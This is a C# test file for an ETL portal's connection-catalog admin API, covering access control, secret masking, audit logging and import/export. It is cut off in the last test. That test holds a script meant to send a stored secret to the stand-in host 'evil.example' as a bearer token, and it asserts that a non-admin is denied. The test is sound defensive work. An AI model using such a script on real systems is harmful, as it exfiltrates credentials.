using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using System.Text.Json.Nodes;
using ETL_SQL.Core.Data;
using ETL_SQL.Core.Governance;
using ETL_SQL.Portal.Data;
using ETL_SQL.Portal.Services;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;

namespace ETL_SQL.Portal.Tests;

[Trait("Category", "Portal")]
public class PortalConnectionCatalogApiTests
{
    private static readonly JsonSerializerOptions Json = new(JsonSerializerDefaults.Web);

    [Fact]
    public async Task Endpoints_RejectAnonymousCallers()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();

        Assert.Equal(HttpStatusCode.Unauthorized, (await client.GetAsync("/api/admin/connections")).StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized,
            (await client.PutAsJsonAsync("/api/admin/connections/x", new { connectorType = "MSSQL" })).StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, (await client.GetAsync("/api/admin/connections/export")).StatusCode);
    }

    [Fact]
    public async Task Lifecycle_SetVerifyDisableDeleteExportImport_WithAudit()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        // stage the secret the entry references
        using (var scope = factory.Services.CreateScope())
        {
            await scope.ServiceProvider.GetRequiredService<PortalSecretStoreService>()
                .StoreAsync("sales_db_password", "s3cret-value");
        }

        // create
        var set = await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/sales_dw", new
        {
            connectorType = "MSSQL",
            options = new Dictionary<string, string>
            {
                ["SERVER"] = "sql01",
                ["DATABASE"] = "Sales",
                ["PASSWORD"] = "SECRET:sales_db_password"
            },
            environmentScope = "Prod"
        });
        Assert.Equal(HttpStatusCode.NoContent, set.StatusCode);

        // list + detail: reference visible, secret value never present
        var list = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections", null);
        Assert.Contains("sales_dw", await list.Content.ReadAsStringAsync());
        var detail = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/sales_dw", null);
        var detailBody = await detail.Content.ReadAsStringAsync();
        Assert.Contains("SECRET:sales_db_password", detailBody);
        Assert.DoesNotContain("s3cret-value", detailBody);

        // verify resolves the SECRET: reference
        var verify = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/sales_dw/verify", null);
        Assert.Equal(HttpStatusCode.OK, verify.StatusCode);
        var verifyBody = await verify.Content.ReadFromJsonAsync<JsonObject>(Json);
        Assert.Equal(1, verifyBody!["secretReferences"]!.GetValue<int>());

        // engine-facing provider resolves the definition under an authorized identity and touches last-used
        var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
        Assert.Equal("PortalCatalog", provider.ProviderName);
        var adminIdentity = new ExecutionIdentity { EffectiveUser = "admin", RealUser = "admin", IsAdmin = true };
        var definition = await provider.ResolveAsync("sales_dw", adminIdentity);
        Assert.Equal("MSSQL", definition.ConnectorType);
        Assert.Equal("sql01", definition.Options["SERVER"]);
        using (var scope = factory.Services.CreateScope())
        {
            var entity = await scope.ServiceProvider.GetRequiredService<PortalDbContext>()
                .PortalSharedConnections.AsNoTracking().SingleAsync(c => c.Alias == "sales_dw");
            Assert.NotNull(entity.LastUsedAtUtc);
            Assert.NotNull(entity.LastVerifiedAtUtc);
        }

        // export → delete → import round-trip
        var export = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/export", null);
        var exported = await export.Content.ReadFromJsonAsync<JsonArray>(Json);
        Assert.Single(exported!);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Delete, token, "/api/admin/connections/sales_dw", null)).StatusCode);
        await Assert.ThrowsAsync<KeyNotFoundException>(() => provider.ResolveAsync("sales_dw", adminIdentity));

        var import = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/import", exported);
        Assert.Equal(HttpStatusCode.OK, import.StatusCode);
        var reimported = await provider.ResolveAsync("sales_dw", adminIdentity);
        Assert.Equal("SECRET:sales_db_password", reimported.Options["PASSWORD"]);

        // disable blocks resolution; enable restores it without re-supplying the definition
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/sales_dw/disable", null)).StatusCode);
        await Assert.ThrowsAsync<InvalidOperationException>(() => provider.ResolveAsync("sales_dw", adminIdentity));
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/sales_dw/enable", null)).StatusCode);
        Assert.Equal("sql01", (await provider.ResolveAsync("sales_dw", adminIdentity)).Options["SERVER"]);
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/sales_dw/disable", null)).StatusCode);

        // audit trail
        using (var scope = factory.Services.CreateScope())
        {
            var actions = await scope.ServiceProvider.GetRequiredService<PortalDbContext>()
                .AuditLogs.Where(a => a.ResourceType == "PortalSharedConnection")
                .Select(a => a.Action).ToListAsync();
            Assert.Contains("SHARED_CONNECTION_CREATE", actions);
            Assert.Contains("SHARED_CONNECTION_VERIFY", actions);
            Assert.Contains("SHARED_CONNECTION_EXPORT", actions);
            Assert.Contains("SHARED_CONNECTION_IMPORT", actions);
            Assert.Contains("SHARED_CONNECTION_DELETE", actions);
            Assert.Contains("SHARED_CONNECTION_DISABLE", actions);
            Assert.Contains("SHARED_CONNECTION_ENABLE", actions);
        }
    }

    [Fact]
    public async Task WebhookLifecycle_PreservesSecretUrlAndFailsClosedWhenSecretIsMissing()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        var set = await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/notify_webhook", new
        {
            connectorType = "WEBHOOK",
            options = new Dictionary<string, string>
            {
                ["URL"] = "SECRET:webhook_url",
                ["FORMAT"] = "generic"
            }
        });
        Assert.Equal(HttpStatusCode.NoContent, set.StatusCode);

        var detail = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/notify_webhook", null);
        Assert.Equal(HttpStatusCode.OK, detail.StatusCode);
        var detailBody = await detail.Content.ReadAsStringAsync();
        Assert.Contains("SECRET:webhook_url", detailBody);
        Assert.DoesNotContain("https://hooks.example", detailBody, StringComparison.OrdinalIgnoreCase);

        var verify = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/notify_webhook/verify", null);
        Assert.Equal(HttpStatusCode.Conflict, verify.StatusCode);
        var verifyBody = await verify.Content.ReadAsStringAsync();
        Assert.Contains("unresolvable", verifyBody, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("https://hooks.example", verifyBody, StringComparison.OrdinalIgnoreCase);

        var test = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/notify_webhook/test", null);
        Assert.Equal(HttpStatusCode.Conflict, test.StatusCode);
        var testBody = await test.Content.ReadAsStringAsync();
        Assert.Contains("unresolvable", testBody, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("https://hooks.example", testBody, StringComparison.OrdinalIgnoreCase);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/notify_webhook/disable", null)).StatusCode);

        var export = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/export", null);
        Assert.Equal(HttpStatusCode.OK, export.StatusCode);
        var exported = await export.Content.ReadFromJsonAsync<JsonArray>(Json);
        var exportedWebhook = Assert.Single(exported!, e => e!["alias"]!.GetValue<string>() == "notify_webhook");
        Assert.True(exportedWebhook!["disabled"]!.GetValue<bool>());
        Assert.Equal("SECRET:webhook_url", exportedWebhook["options"]!["URL"]!.GetValue<string>());

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Delete, token, "/api/admin/connections/notify_webhook", null)).StatusCode);
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/import", exported)).StatusCode);

        using var scope = factory.Services.CreateScope();
        var catalog = scope.ServiceProvider.GetRequiredService<PortalConnectionCatalogService>();
        Assert.Equal(SecretLifecycleStatus.Disabled, await catalog.GetStatusAsync("notify_webhook"));
        var imported = await catalog.GetDetailAsync("notify_webhook");
        Assert.NotNull(imported);
        Assert.Equal("SECRET:webhook_url", imported!.Options["URL"]);

        var actions = await scope.ServiceProvider.GetRequiredService<PortalDbContext>()
            .AuditLogs.Where(a => a.ResourceType == "PortalSharedConnection" && a.ResourceId == "notify_webhook")
            .Select(a => a.Action).ToListAsync();
        Assert.Contains("SHARED_CONNECTION_CREATE", actions);
        Assert.Contains("SHARED_CONNECTION_VERIFY", actions);
        Assert.Contains("SHARED_CONNECTION_TEST", actions);
        Assert.Contains("SHARED_CONNECTION_DISABLE", actions);
        Assert.Contains("SHARED_CONNECTION_DELETE", actions);
        Assert.Contains("SHARED_CONNECTION_IMPORT", actions);
    }

    [Fact]
    public async Task WebhookAdminEndpoints_RejectNonAdminCallers()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var adminToken = await GetAdminTokenAsync(client);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, adminToken, "/api/admin/connections/notify_webhook", new
            {
                connectorType = "WEBHOOK",
                options = new Dictionary<string, string>
                {
                    ["URL"] = "SECRET:webhook_url",
                    ["FORMAT"] = "generic"
                }
            })).StatusCode);

        var publisher = await CreateReadyUserAsync(client, adminToken, "webhook_pub", "Publisher");
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, publisher.AccessToken, "/api/admin/connections/notify_webhook", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Post, publisher.AccessToken, "/api/admin/connections/notify_webhook/verify", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Post, publisher.AccessToken, "/api/admin/connections/notify_webhook/test", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, publisher.AccessToken, "/api/admin/connections/export", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Post, publisher.AccessToken, "/api/admin/connections/import", Array.Empty<object>())).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Post, publisher.AccessToken, "/api/admin/connections/notify_webhook/disable", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Delete, publisher.AccessToken, "/api/admin/connections/notify_webhook", null)).StatusCode);
    }

    [Fact]
    public async Task UseAcls_RestrictExpansionToAdminsOwnersAndGrantedGroups()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        // catalog a new entry (deny-by-default before any grant)
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/acl_dw", new
            {
                connectorType = "MSSQL",
                options = new Dictionary<string, string> { ["SERVER"] = "sql01" }
            })).StatusCode);

        var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
        var admin = new ExecutionIdentity { EffectiveUser = "root", RealUser = "root", IsAdmin = true };
        var outsider = new ExecutionIdentity
        {
            EffectiveUser = "bob",
            RealUser = "bob",
            IsAdmin = false,
            Groups = ["OtherTeam"]
        };
        var member = new ExecutionIdentity
        {
            EffectiveUser = "ann",
            RealUser = "ann",
            IsAdmin = false,
            Groups = ["connusers"]
        };

        // no grants → denied to identity-less callers and non-admin/non-owner users; admin allowed
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw"));
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", outsider));
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", member));
        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", admin)).Options["SERVER"]);

        // create a group and grant it use
        var group = await SendAsync(client, HttpMethod.Post, token, "/api/admin/groups", new { name = "ConnUsers" });
        Assert.Equal(HttpStatusCode.Created, group.StatusCode);
        var groupId = (await group.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/acl_dw/acl", new { groupId })).StatusCode);

        var acl = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/acl_dw/acl", null);
        var aclBody = await acl.Content.ReadFromJsonAsync<JsonArray>(Json);
        Assert.Single(aclBody!);
        Assert.Equal("ConnUsers", aclBody![0]!["groupName"]!.GetValue<string>());

        // once granted: no identity → denied (fail closed) and the denial is audited
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw"));

        // non-member, non-admin identity → denied
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", outsider));

        // group member (name-based federated identity) → allowed
        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", member)).Options["SERVER"]);

        // admin → allowed
        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", admin)).Options["SERVER"]);

        // revoke last grant → stays closed to identity-less callers and non-admins, open only to admin/owner
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Delete, token, $"/api/admin/connections/acl_dw/acl/{groupId}", null)).StatusCode);
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw"));
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", member));
        await Assert.ThrowsAsync<UnauthorizedAccessException>(() => provider.ResolveAsync("acl_dw", outsider));
        Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", admin)).Options["SERVER"]);

        // owner without admin role can resolve ungranted entry, other non-admins cannot
        using (var scopeOwner = factory.Services.CreateScope())
        {
            var db = scopeOwner.ServiceProvider.GetRequiredService<PortalDbContext>();
            var conn = await db.PortalSharedConnections.SingleAsync(c => c.Alias == "acl_dw");
            conn.OwnerUserId = 4242;
            await db.SaveChangesAsync();

            var catalogService = scopeOwner.ServiceProvider.GetRequiredService<PortalConnectionCatalogService>();
            var ownerIdentity = new ExecutionIdentity
            {
                EffectiveUser = "owner4242",
                EffectiveUserId = 4242,
                RealUser = "owner4242",
                IsAdmin = false
            };
            Assert.Equal("sql01", (await provider.ResolveAsync("acl_dw", ownerIdentity)).Options["SERVER"]);
            Assert.Contains("acl_dw", await catalogService.ListUsableAliasesAsync(ownerIdentity));
            Assert.DoesNotContain("acl_dw", await catalogService.ListUsableAliasesAsync(member));
        }

        using var scope = factory.Services.CreateScope();
        var actions = await scope.ServiceProvider.GetRequiredService<PortalDbContext>()
            .AuditLogs.Where(a => a.ResourceType == "PortalSharedConnection" && a.ResourceId == "acl_dw")
            .Select(a => a.Action).ToListAsync();
        Assert.Contains("SHARED_CONNECTION_GRANT_USE", actions);
        Assert.Contains("SHARED_CONNECTION_REVOKE_USE", actions);
        Assert.Contains("SHARED_CONNECTION_USE_DENIED", actions);
    }

    [Fact]
    public async Task DesignerSchema_UsesCatalogAclsAndDoesNotLeakRestrictedSchema()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/designer_mock", new
            {
                connectorType = "MOCKDB",
                options = new Dictionary<string, string>()
            })).StatusCode);

        var group = await SendAsync(client, HttpMethod.Post, token, "/api/admin/groups", new { name = "DesignerConnUsers" });
        Assert.Equal(HttpStatusCode.Created, group.StatusCode);
        var groupId = (await group.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/designer_mock/acl", new { groupId })).StatusCode);

        var adminSchema = await SendAsync(client, HttpMethod.Get, token, "/api/designer/schema?connection=designer_mock", null);
        Assert.Equal(HttpStatusCode.OK, adminSchema.StatusCode);
        var adminBody = await adminSchema.Content.ReadFromJsonAsync<JsonObject>(Json);
        Assert.Contains(adminBody!["tables"]!.AsArray(), t => t!["name"]!.GetValue<string>() == "Users");

        var adminPreview = await SendAsync(client, HttpMethod.Post, token, "/api/designer/data-preview", new
        {
            sourceKind = "connection",
            connection = "designer_mock",
            table = "Users",
            documentUri = "portal://designer/session-1"
        });
        Assert.Equal(HttpStatusCode.OK, adminPreview.StatusCode);
        var previewBody = await adminPreview.Content.ReadFromJsonAsync<JsonObject>(Json);
        Assert.Equal("connection", previewBody!["sourceKind"]!.GetValue<string>());
        Assert.Equal("designer_mock.Users", previewBody["source"]!.GetValue<string>());
        Assert.InRange(previewBody["rows"]!.AsArray().Count, 1, 100);

        var adminComplete = await SendAsync(client, HttpMethod.Post, token, "/api/designer/complete", new
        {
            script = "SELECT * FROM designer_mock.",
            line = 0,
            column = 28,
            connectionRef = "designer_mock",
            documentUri = "portal://designer/session-1"
        });
        var adminCompleteBody = await adminComplete.Content.ReadAsStringAsync();
        Assert.Equal(HttpStatusCode.OK, adminComplete.StatusCode);
        Assert.Contains("designer_mock.Users", adminCompleteBody);

        var outsider = await CreateReadyUserAsync(client, token, "designer_outsider", "Publisher");
        var deniedSchema = await SendAsync(client, HttpMethod.Get, outsider.AccessToken, "/api/designer/schema?connection=designer_mock", null);
        var deniedBody = await deniedSchema.Content.ReadAsStringAsync();

        Assert.Equal(HttpStatusCode.Forbidden, deniedSchema.StatusCode);
        Assert.DoesNotContain("Users", deniedBody);
        Assert.DoesNotContain("Orders", deniedBody);

        var deniedPreview = await SendAsync(client, HttpMethod.Post, outsider.AccessToken, "/api/designer/data-preview", new
        {
            sourceKind = "connection",
            connection = "designer_mock",
            table = "Users"
        });
        var deniedPreviewBody = await deniedPreview.Content.ReadAsStringAsync();
        Assert.Equal(HttpStatusCode.Forbidden, deniedPreview.StatusCode);
        Assert.DoesNotContain("Users", deniedPreviewBody);
        Assert.DoesNotContain("Orders", deniedPreviewBody);

        var deniedComplete = await SendAsync(client, HttpMethod.Post, outsider.AccessToken, "/api/designer/complete", new
        {
            script = "SELECT * FROM designer_mock.",
            line = 0,
            column = 28,
            connectionRef = "designer_mock"
        });
        var deniedCompleteBody = await deniedComplete.Content.ReadAsStringAsync();

        Assert.Equal(HttpStatusCode.Forbidden, deniedComplete.StatusCode);
        Assert.DoesNotContain("Users", deniedCompleteBody);
        Assert.DoesNotContain("Orders", deniedCompleteBody);
    }

    [Fact]
    public async Task SensitiveFields_RoundTripMaskExportAndResolve()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        using (var scope = factory.Services.CreateScope())
        {
            await scope.ServiceProvider.GetRequiredService<PortalSecretStoreService>()
                .StoreAsync("prod_host", "pg01.internal");
        }

        var set = await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/sensitive_dw", new
        {
            connectorType = "POSTGRES",
            target = "Host=pg01.internal;Database=dw",
            options = new Dictionary<string, string>
            {
                ["HOST"] = "SECRET:prod_host",
                ["DATABASE"] = "dw"
            },
            sensitiveFields = new[] { "HOST" }
        });
        Assert.Equal(HttpStatusCode.NoContent, set.StatusCode);

        var detail = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/sensitive_dw", null);
        Assert.Equal(HttpStatusCode.OK, detail.StatusCode);
        var body = await detail.Content.ReadAsStringAsync();
        Assert.Contains("SECRET:prod_host", body);
        Assert.Contains("\"sensitiveFields\":[\"HOST\"]", body);
        Assert.DoesNotContain("pg01.internal", body);

        var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
        var adminIdentity = new ExecutionIdentity { EffectiveUser = "admin", RealUser = "admin", IsAdmin = true };
        var definition = await provider.ResolveAsync("sensitive_dw", adminIdentity);
        Assert.Contains("HOST", definition.SensitiveFields!);

        var export = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/export", null);
        var exported = await export.Content.ReadFromJsonAsync<JsonArray>(Json);
        var entry = Assert.Single(exported!);
        Assert.Equal("HOST", entry!["sensitiveFields"]![0]!.GetValue<string>());

        var maskedSave = await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/sensitive_dw", new
        {
            connectorType = "POSTGRES",
            target = "Host=********;Database=dw",
            options = new Dictionary<string, string> { ["DATABASE"] = "dw" },
            sensitiveFields = new[] { "HOST" }
        });
        Assert.Equal(HttpStatusCode.BadRequest, maskedSave.StatusCode);
        Assert.Contains("masked display placeholder", await maskedSave.Content.ReadAsStringAsync());
    }

    [Fact]
    public async Task Impact_ListsReferencingScriptsJobsCatalogEntriesAndConsumers()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        // a catalog entry whose credential references a secret
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/impact_dw", new
            {
                connectorType = "MSSQL",
                options = new Dictionary<string, string> { ["SERVER"] = "sql01", ["PASSWORD"] = "SECRET:impact_secret" }
            })).StatusCode);

        // a published report whose script references both the alias and the secret
        using (var scope = factory.Services.CreateScope())
        {
            var db = scope.ServiceProvider.GetRequiredService<PortalDbContext>();
            var config = factory.Services.GetRequiredService<PortalConfig>();
            var scriptRoot = Path.GetFullPath(config.ScriptRootPath);
            Directory.CreateDirectory(scriptRoot);
            await File.WriteAllTextAsync(
                Path.Combine(scriptRoot, "impact_report.rptsql"),
                "CREATE CONNECTION dw AS MSSQL('SHARED:impact_dw');\n-- also uses SECRET:impact_secret");

            var folder = new Folder { Name = "impact", Path = "/impact", OwnerId = 1 };
            db.Folders.Add(folder);
            await db.SaveChangesAsync();
            var report = new Report
            {
                FolderId = folder.Id,
                Name = "Impact Report",
                ScriptPath = "impact_report.rptsql",
                CreatedBy = 1
            };
            db.Reports.Add(report);
            await db.SaveChangesAsync();

            var alert = new ReportAlert
            {
                ReportId = report.Id,
                OwnerId = 1,
                Name = "Impact Alert",
                VisualName = "Revenue",
                Operator = ">",
                Threshold = 10
            };
            alert.Notifications.Add(new AlertNotification
            {
                OrchestratorAlias = "impact_dw",
                NotificationName = "OpsNotify"
            });
            db.ReportAlerts.Add(alert);
            db.ReportJobLinks.Add(new ReportJobLink
            {
                ReportId = report.Id,
                OrchestratorAlias = "impact_dw",
                JobName = "ImpactRefreshJob"
            });
            await db.SaveChangesAsync();
        }

        // an orchestrator scheduled job whose script value references the alias
        var jobs = factory.Services.GetRequiredService<IJobHistoryStore>();
        await jobs.InitializeAsync();
        await jobs.SaveJobAsync(new JobDefinition(
            "impact-job", "RUN SCRIPT referencing SHARED:impact_dw", 1, "days", null, null, null));

        // a recorded consumer via authorized resolution
        var impactGroupRes = await SendAsync(client, HttpMethod.Post, token, "/api/admin/groups", new { name = "ImpactUsers" });
        Assert.Equal(HttpStatusCode.Created, impactGroupRes.StatusCode);
        var impactGroupId = (await impactGroupRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/impact_dw/acl", new { groupId = impactGroupId })).StatusCode);

        var provider = factory.Services.GetRequiredService<IConnectionCatalogProvider>();
        var ann = new ExecutionIdentity { EffectiveUser = "ann", RealUser = "ann", IsAdmin = false, Groups = ["ImpactUsers"] };
        _ = await provider.ResolveAsync("impact_dw", ann);

        var connImpact = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/impact_dw/impact", null);
        Assert.Equal(HttpStatusCode.OK, connImpact.StatusCode);
        var connBody = await connImpact.Content.ReadAsStringAsync();
        Assert.Contains("Impact Report", connBody);
        Assert.Contains("impact-job", connBody);
        Assert.Contains("ann", connBody);
        Assert.Contains("Impact Alert", connBody);
        Assert.Contains("OpsNotify", connBody);
        Assert.Contains("ImpactRefreshJob", connBody);

        // the secret's impact includes the report script and the catalog entry that references it
        using (var scope = factory.Services.CreateScope())
        {
            await scope.ServiceProvider.GetRequiredService<PortalSecretStoreService>()
                .StoreAsync("impact_secret", "value");
        }

        var secretImpact = await SendAsync(client, HttpMethod.Get, token, "/api/admin/secrets/impact_secret/impact", null);
        Assert.Equal(HttpStatusCode.OK, secretImpact.StatusCode);
        var secretBody = await secretImpact.Content.ReadAsStringAsync();
        Assert.Contains("Impact Report", secretBody);
        Assert.Contains("impact_dw", secretBody);
    }

    [Fact]
    public async Task Set_RejectsRawCredentialValues()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        var response = await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/bad", new
        {
            connectorType = "MSSQL",
            options = new Dictionary<string, string> { ["PASSWORD"] = "hunter2" }
        });

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Contains("SECRET:name", await response.Content.ReadAsStringAsync());
    }

    [Fact]
    public async Task Detail_MasksNonReferenceCredentialValues()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        // Simulate a legacy/imported row that bypassed write-side validation.
        using (var scope = factory.Services.CreateScope())
        {
            var db = scope.ServiceProvider.GetRequiredService<PortalDbContext>();
            db.PortalSharedConnections.Add(new PortalSharedConnection
            {
                Alias = "legacy",
                ConnectorType = "MSSQL",
                Target = "Server=db;Password=raw-value",
                OptionsJson = """{"TOKEN":"raw-token"}"""
            });
            await db.SaveChangesAsync();
        }

        var detail = await SendAsync(client, HttpMethod.Get, token, "/api/admin/connections/legacy", null);
        var body = await detail.Content.ReadAsStringAsync();

        Assert.Equal(HttpStatusCode.OK, detail.StatusCode);
        Assert.DoesNotContain("raw-value", body);
        Assert.DoesNotContain("raw-token", body);
        Assert.Contains("********", body);
    }

    [Fact]
    public async Task Test_ProbesConnectionThroughSharedCoreWithAuditAndNoSecretLeak()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        using (var scope = factory.Services.CreateScope())
        {
            await scope.ServiceProvider.GetRequiredService<PortalSecretStoreService>()
                .StoreAsync("probe_db_password", "p@ss-should-not-leak");
        }

        // unknown alias → 404
        var missing = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/nope/test", null);
        Assert.Equal(HttpStatusCode.NotFound, missing.StatusCode);

        // catalog an entry pointing at an unresolvable host (.invalid never resolves) so the probe
        // completes deterministically without external network access.
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/probe_dw", new
            {
                connectorType = "MSSQL",
                options = new Dictionary<string, string>
                {
                    ["SERVER"] = "no-such-host.invalid.example",
                    ["PORT"] = "1433",
                    ["PASSWORD"] = "SECRET:probe_db_password",
                },
                environmentScope = "Prod",
            })).StatusCode);

        var test = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/probe_dw/test", null);
        Assert.Equal(HttpStatusCode.OK, test.StatusCode);
        var body = await test.Content.ReadFromJsonAsync<JsonObject>(Json);
        Assert.Equal("probe_dw", body!["alias"]!.GetValue<string>());
        Assert.False(body["succeeded"]!.GetValue<bool>());
        var steps = body["steps"]!.AsArray();
        Assert.NotEmpty(steps);
        Assert.Contains(steps, s => s!["layer"]!.GetValue<string>() == "POLICY");
        // The resolved secret value is never fetched by a DNS/TCP probe and must never surface.
        Assert.DoesNotContain("p@ss-should-not-leak", await test.Content.ReadAsStringAsync());

        // disabled → 409
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/probe_dw/disable", null)).StatusCode);
        var disabled = await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/probe_dw/test", null);
        Assert.Equal(HttpStatusCode.Conflict, disabled.StatusCode);

        using var auditScope = factory.Services.CreateScope();
        var actions = await auditScope.ServiceProvider.GetRequiredService<PortalDbContext>()
            .AuditLogs.Where(a => a.ResourceType == "PortalSharedConnection" && a.ResourceId == "probe_dw")
            .Select(a => a.Action).ToListAsync();
        Assert.Contains("SHARED_CONNECTION_TEST", actions);
    }

    [Fact]
    public async Task DirectSecretInScript_DeniedForNonAdminInPortalExecution_WhileAuthorizedSharedAllowed()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var token = await GetAdminTokenAsync(client);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/secrets/portal_webhook_secret",
                new { value = "https://hooks.example/restricted-secret-path" })).StatusCode);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, token, "/api/admin/connections/restricted_webhook", new
            {
                connectorType = "WEBHOOK",
                options = new Dictionary<string, string>
                {
                    ["URL"] = "SECRET:portal_webhook_secret",
                    ["FORMAT"] = "generic"
                },
                sensitiveFields = new[] { "URL" }
            })).StatusCode);

        var (userId, _) = await CreateReadyUserAsync(client, token, "directsec", "Publisher");
        var nonAdminIdentity = new ExecutionIdentity
        {
            EffectiveUser = $"user_{userId}",
            EffectiveUserId = userId,
            RealUser = $"user_{userId}",
            IsAdmin = false
        };

        var executor = factory.Services.GetRequiredService<ETL_SQL.Core.IScriptExecutor>();
        var directAttempt = await executor.ExecuteTextAsync(
            "CREATE CONNECTION hijack AS WEBHOOK('https://evil.example/hook', BEARER_TOKEN = 'SECRET:portal_webhook_secret');",
            Guid.NewGuid().ToString("N"),
            CancellationToken.None,
            executionIdentity: nonAdminIdentity);

        Assert.False(directAttempt.Success);
